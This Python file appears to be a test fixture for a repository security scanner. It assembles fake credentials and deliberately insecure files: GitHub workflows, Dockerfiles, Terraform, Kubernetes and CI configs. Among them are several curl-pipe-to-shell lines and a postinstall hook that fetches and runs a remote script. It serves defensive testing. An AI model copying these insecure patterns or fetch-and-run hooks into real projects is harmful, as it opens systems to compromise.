"""A tree that trips every rule in the catalogue, exactly once each.

Two jobs. It is the fixture behind the catalogue drift test -- every rule
described in :mod:`repo_sentinel.rules` has to fire here, and every rule that
fires here has to be described there -- and it is a standing end-to-end check
that the scanners still work when pointed at a file rather than a string.

Every credential is invented and assembled from pieces at import time, for the
reason :mod:`fixtures` explains: a well-formed token written as one literal is
rejected by GitHub's push protection, correctly, and no fixture is worth
costing a person a judgement call.
"""

import base64

import fixtures

_ALNUM = "aB3dEf7hIj0kLm2nOp5qRs8tUv1wXy4z"


def _filler(length, alphabet=_ALNUM):
    return (alphabet * (length // len(alphabet) + 1))[:length]


def _b64(value):
    """Encode the way a Kubernetes Secret does, so K8S007 has to decode it."""
    return base64.b64encode(value.encode()).decode()


SECRETS_FILE = "\n".join(
    (
        f'aws_key = "{fixtures.REALISTIC_AWS_KEY_ID}"',
        "github_pat = " + '"gh' + "p_" + _filler(36) + '"',
        "fine_grained = " + '"github' + "_pat_" + _filler(60) + '"',
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        'stripe = "sk' + "_live_" + _filler(24) + '"',
        'slack = "xox' + "b-" + _filler(24) + '"',
        'google = "AIz' + "a" + _filler(35) + '"',
        'openai = "sk' + "-proj-" + _filler(32) + '"',
        "jwt = " + '"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYmMxMjM0NTY3ODkifQ.' + _filler(24) + '"',
        'stripe_test = "sk' + "_test_" + _filler(24) + '"',
        'azure = "DefaultEndpointsProtocol=https;AccountKey=' + _filler(86, "aB3dEf7h") + '=="',
        'google_oauth = "GOC' + "SPX-" + _filler(28) + '"',
        'sendgrid = "S' + "G." + _filler(22) + "." + _filler(43) + '"',
        'twilio = "S' + "K" + _filler(32, "0a1b2c3d4e5f") + '"',
        'npm = "np' + "m_" + _filler(36) + '"',
        'pypi = "pyp' + "i-AgEIcHlwaS5vcmc" + _filler(60) + '"',
        'docker = "dck' + "r_pat_" + _filler(24) + '"',
        'slack_hook = "https://hooks.sl' + "ack.com/services/T" + _filler(32) + '"',
        'huggingface = "h' + "f_" + _filler(34) + '"',
        'dsn = "postgres://svc:Xk92mQp7Lz4TvB8n@db.internal:5432/app"',
        'gitlab = "glp' + 'at-' + _filler(24) + '"',
        'runner = "glr' + 't-' + _filler(24) + '"',
        'ocean = "dop' + '_v1_' + _filler(64, "0a1b2c3d4e5f") + '"',
        'shopify = "shp' + 'at_' + _filler(32, "0a1b2c3d4e5f") + '"',
        'bricks = "dap' + 'i' + _filler(32, "0a1b2c3d4e5f") + '"',
        'doppler = "dp' + '.pt.' + _filler(44) + '"',
        'grafana = "gls' + 'a_' + _filler(32) + '_' + _filler(8, "0a1b2c3d4e5f") + '"',
        'telegram = "123456789' + ':AA' + _filler(33) + '"',
        'postman = "PMA' + 'K-' + _filler(24, "0a1b2c3d4e5f") + '-' + _filler(34, "0a1b2c3d4e5f") + '"',
        'linear = "lin' + '_api_' + _filler(40) + '"',
        'atlassian = "ATA' + 'TT3x' + _filler(120) + '"',
        'square = "sq0' + 'atp-' + _filler(22) + '"',
        'slack_app = "xap' + 'p-1-A01B02C03-1234567890-' + _filler(32, "0a1b2c3d4e5f") + '"',
        'discord = "M' + 'TA1B2c3D4e5F6g7H8i9J0k1L' + '.Ab3dEf.' + _filler(27) + '"',
        'mailgun = "key' + '-' + _filler(32, "0a1b2c3d4e5f") + '"',
        'mailchimp = "' + _filler(32, "0a1b2c3d4e5f") + '-us21"',
        'newrelic = "NRA' + 'K-' + _filler(27, "ABCDEFGHIJKLMNOPQRSTUVWXYZ1") + '"',
        'sentry = "https://' + _filler(32, "0a1b2c3d4e5f") + '@o123.ingest.example.invalid/456"',
        'asana = "1/' + _filler(16, "1234567890") + ':' + _filler(32, "0a1b2c3d4e5f") + '"',
        'dropbox = "sl' + '.' + _filler(136) + '"',
        'figma = "fig' + 'd_' + _filler(40) + '"',
        'airtable = "pat' + _filler(14) + '.' + _filler(64, "0a1b2c3d4e5f") + '"',
        'artifactory = "AKC' + 'p8' + _filler(64) + '"',
        'tfcloud = "' + _filler(14) + '.atlasv1.' + _filler(48) + '"',
        'fcm = "AAA' + 'A' + _filler(7) + ':APA91b' + _filler(136) + '"',
        'session_secret = "Qq7Zx9Lm2Pv4Rt8WcY6h"',
    )
)

SERVICE_ACCOUNT_FILE = "\n".join(
    (
        "{",
        '  "type": "service_account",',
        '  "project_id": "billing-prod",',
        '  "private_key_id": "' + _filler(40) + '",',
        '  "client_email": "svc@billing-prod.iam.gserviceaccount.com"',
        "}",
    )
)

ENV_FILE = "\n".join(
    (
        "APP_NAME=billing",
        "AWS_BACKUP=" + _b64("aws_access_key_id=" + fixtures.REALISTIC_AWS_KEY_ID),
        "DATABASE_PASSWORD=Tv8nRw1YXk92mQp7Lz4T",
    )
)

RUNAWAY_SUPPRESSION_FILE = "\n".join(
    (
        "settings = {}",
        "# repo-sentinel: ignore-start",
        "generated = 1",
    )
)

WORKFLOW_FILE = """name: risky
on:
  pull_request_target:
  workflow_run:
    workflows: [CI]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "token=${{ secrets.DEPLOY_TOKEN }}" >> $GITHUB_OUTPUT
      - uses: some-vendor/deploy@v2
        with:
          token: ${{ secrets.DEPLOY_TOKEN }}
      - run: echo "reviewing ${{ github.event.issue.title }}"
  audit:
    permissions: write-all
    runs-on: [self-hosted, linux]
    steps:
      - run: make audit
"""

DOCKERFILE = """FROM golang:1.22 AS build
RUN go build ./...

FROM debian:latest
ARG NPM_TOKEN=Xk92mQp7Lz4TvB8nRw1Y
RUN curl -sSL https://get.example.io/install.sh | bash
RUN wget --no-check-certificate https://example.invalid/pkg.tar.gz
ADD https://example.invalid/app.tar.gz /opt/
CMD ["/app"]
"""

TERRAFORM_FILE = """terraform {
  backend "s3" {
    bucket = "tfstate"
    key    = "prod.tfstate"
  }
}

resource "aws_security_group" "web" {
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_s3_bucket" "assets" {
  acl = "public-read"
}

resource "aws_db_instance" "main" {
  publicly_accessible = true
  storage_encrypted   = false
}

resource "azurerm_storage_account" "logs" {
  enable_https_traffic_only = false
}

data "aws_iam_policy_document" "admin" {
  statement {
    actions   = ["*"]
    resources = ["*"]
  }
}
"""

MANIFEST_FILE = """apiVersion: apps/v1
kind: Deployment
metadata:
  name: web
spec:
  template:
    spec:
      hostNetwork: true
      containers:
        - name: app
          image: nginx
          ports:
            - containerPort: 22
              hostPort: 22
          securityContext:
            privileged: true
            runAsUser: 0
            capabilities:
              add: ["SYS_ADMIN"]
      volumes:
        - name: sock
          hostPath:
            path: /var/run/docker.sock
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: everything
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: open
roleRef:
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: Group
    name: system:unauthenticated
---
apiVersion: v1
kind: Secret
metadata:
  name: db
data:
  password: """ + _b64("Tv8nRw1YXk92mQp7Lz4T") + """
"""

COMPOSE_FILE = """services:
  db:
    image: postgres
    ports:
      - "5432:5432"
  runner:
    image: ci:1.2
    privileged: true
    network_mode: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    security_opt:
      - seccomp:unconfined
"""

PIPELINE_FILE = """stages: [build]

variables:
  CI_DEBUG_TRACE: "true"

build:
  image: python
  script:
    - echo "Building $CI_COMMIT_TITLE"
    - curl -sSL https://get.example.invalid/install.sh | bash
"""

TEMPLATE_FILE = """AWSTemplateFormatVersion: "2010-09-09"
Resources:
  WebSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22
          CidrIp: 0.0.0.0/0
  Assets:
    Type: AWS::S3::Bucket
    Properties:
      AccessControl: PublicRead
  Database:
    Type: AWS::RDS::DBInstance
    Properties:
      PubliclyAccessible: true
      StorageEncrypted: false
  AdminRole:
    Type: AWS::IAM::Role
    Properties:
      Policies:
        - PolicyDocument:
            Statement:
              - Effect: Allow
                Action: "*"
                Resource: "*"
"""

PACKAGE_JSON = """{
  "name": "billing",
  "scripts": {
    "postinstall": "curl -sSL https://get.example.invalid/i.sh | sh"
  },
  "dependencies": {
    "internal-lib": "git+https://github.example.invalid/acme/internal-lib.git"
  }
}
"""

NPMRC_FILE = "registry=http://registry.example.invalid/\nstrict-ssl=false\n"

PLAYBOOK_FILE = """---
- name: Configure web servers
  hosts: web
  tasks:
    - name: Install the vendor agent
      get_url:
        url: http://downloads.example.invalid/agent.tar.gz
        dest: /tmp/agent.tar.gz
        validate_certs: no

    - name: Drop a helper script
      copy:
        src: helper.sh
        dest: /usr/local/bin/helper
        mode: "0777"
"""

AZURE_PIPELINE_FILE = """trigger:
  - main

variables:
  system.debug: true

pool:
  name: our-build-servers

container: node

steps:
  - script: echo "Building $(Build.SourceVersionMessage)"
    displayName: Build
"""

CIRCLECI_FILE = """version: 2.1
orbs:
  aws-cli: circleci/aws-cli@volatile
jobs:
  build:
    docker:
      - image: cimg/node
    steps:
      - run:
          name: Greet
          command: echo "Building $CIRCLE_BRANCH"
      - run: curl -sSL https://get.example.invalid/i.sh | sh
"""

JENKINSFILE = """pipeline {
  agent {
    docker { image 'node:latest' }
  }
  stages {
    stage('Build') {
      steps {
        sh "echo Building ${env.BRANCH_NAME}"
        sh 'curl -sSL https://get.example.invalid/i.sh | sh'
      }
    }
  }
}
"""

#: ``(path, text)`` pairs, in the shape :func:`iter_files` yields.
FILES = (
    ("src/config.py", SECRETS_FILE),
    (".env", ENV_FILE),
    ("deploy/service-account.json", SERVICE_ACCOUNT_FILE),
    ("src/generated.py", RUNAWAY_SUPPRESSION_FILE),
    (".github/workflows/risky.yml", WORKFLOW_FILE),
    ("Dockerfile", DOCKERFILE),
    ("infra/main.tf", TERRAFORM_FILE),
    ("deploy/web.yaml", MANIFEST_FILE),
    ("docker-compose.yml", COMPOSE_FILE),
    (".gitlab-ci.yml", PIPELINE_FILE),
    ("infra/stack.yaml", TEMPLATE_FILE),
    ("package.json", PACKAGE_JSON),
    ("web/.npmrc", NPMRC_FILE),
    ("playbooks/web.yml", PLAYBOOK_FILE),
    ("azure-pipelines.yml", AZURE_PIPELINE_FILE),
    (".circleci/config.yml", CIRCLECI_FILE),
    ("Jenkinsfile", JENKINSFILE),
)

#: ``(path, text)`` pairs, in the shape the walk reports, with None for the
#: files it could not read. The names are the point here: two of these could
#: not be read at all, and the third is judged on what is in it.
PATHS = (
    *FILES,
    ("deploy/id_rsa", None),
    ("certs/server.pem", None),
    (".npmrc", "//registry.npmjs.org/:_authToken=" + _filler(36)),
    ("infra/terraform.tfstate", '{"version": 4, "resources": []}'),
)
